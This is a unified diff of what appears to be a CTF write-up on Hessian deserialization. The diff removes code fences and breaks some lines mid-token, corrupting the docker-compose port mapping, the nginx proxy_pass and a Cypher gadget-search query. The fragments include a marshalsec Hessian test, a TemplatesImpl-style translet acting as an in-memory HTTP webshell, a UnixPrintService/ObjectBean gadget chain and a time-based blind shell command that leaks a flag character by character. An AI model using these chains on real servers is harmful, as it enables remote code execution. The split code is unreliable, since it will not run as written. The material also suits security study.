@@ -32,17 +32,13 @@
 25
 26
 27
-```
-
-
-
-```
 version: '2.4'
 services:
  nginx:
  image: nginx:1.15
  ports:
- - "0.0.0.0:8090:80"
+ - "0.0.0.0:
+8090:80"
  restart: always
  volumes:
  - ./nginx.conf:/etc/nginx/conf.d/default.conf:ro
@@ -64,11 +60,6 @@ networks:
  out_network:
  ipam:
  driver: default
-```
-
-
-
-```
 1
 2
 3
@@ -88,11 +79,6 @@ networks:
 17
 18
 19
-```
-
-
-
-```
 server {
  listen 80;
  server_name localhost;
@@ -100,7 +86,8 @@ server {
  location / {
  root /usr/share/nginx/html;
  index index.html index.htm;
- proxy_pass http://web:8090;
+ proxy_pass http://web:
+8090;
  }
 
  #error_page 404 /404.html;
@@ -112,11 +99,6 @@ server {
  root /usr/share/nginx/html;
  }
 }
-```
-
-
-
-```
 1
 2
 3
@@ -128,11 +110,6 @@ server {
 9
 10
 11
-```
-
-
-
-```
 public Object getObject()
  throws IOException, ClassNotFoundException
 {
@@ -144,11 +121,6 @@ public Object getObject()
  a.close();
  return obj;
 }
-```
-
-
-
-```
 1
 2
 3
@@ -208,11 +180,6 @@ public Object getObject()
 57
 58
 59
-```
-
-
-
-```
 package marshalsec;
 
 import com.caucho.hessian.io.Hessian2Input;
@@ -271,11 +238,6 @@ public class Test {
 
  }
 }
-```
-
-
-
-```
 1
 2
 3
@@ -367,11 +329,6 @@ public class Test {
 89
 90
 91
-```
-
-
-
-```
 import com.sun.net.httpserver.HttpContext;
 import com.sun.net.httpserver.HttpExchange;
 import com.sun.net.httpserver.HttpHandler;
@@ -462,27 +419,12 @@ public class Yyds extends AbstractTranslet implements HttpHandler {
  }
 
 }
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
 HessianBase.NoWriteReplaceSerializerFactory sf = new HessianBase.NoWriteReplaceSerializerFactory();
 sf.setAllowNonSerializable(true);
 output.setSerializerFactory(sf);
-```
-
-
-
-```
 1
 2
 3
@@ -502,12 +444,7 @@ output.setSerializerFactory(sf);
 17
 18
 19
-```
-
-
-
-```
-Constructor<UnixPrintService> declaredConstructor = UnixPrintService.class.getDeclaredConstructor(String.class);
+Constructor declaredConstructor = UnixPrintService.class.getDeclaredConstructor(String.class);
 declaredConstructor.setAccessible(true);
 ObjectBean delegate = new ObjectBean(sun.print.UnixPrintService.class,
 
@@ -526,28 +463,11 @@ output.getBytesOutputStream().flush();
 output.completeMessage();
 output.close();
 System.out.println(new String(Base64.getEncoder().encode(os.toByteArray())));
-```
-
-
-
-```
 1
-```
-
-
-
-```
 if [ `cut -c 1 flag` = "a" ];then sleep 2;fi
-```
-
-
-
-```
 1
-```
-
-
-
-```
-match path=(m1:Method)-[:CALL*..3]->(m2:Method {}) where m1.NAME =~ "get.*" and m1.PARAMETER_SIZE=0 and (m2.NAME =~ "exec.*" or m2.NAME =~ "readObject") return path
+match path=(m1:
+Method)-[:
+CALL*..3]->(m2:
+Method {}) where m1.NAME =~ "get.*" and m1.PARAMETER_SIZE=0 and (m2.NAME =~ "exec.*" or m2.NAME =~ "readObject") return path
 ```
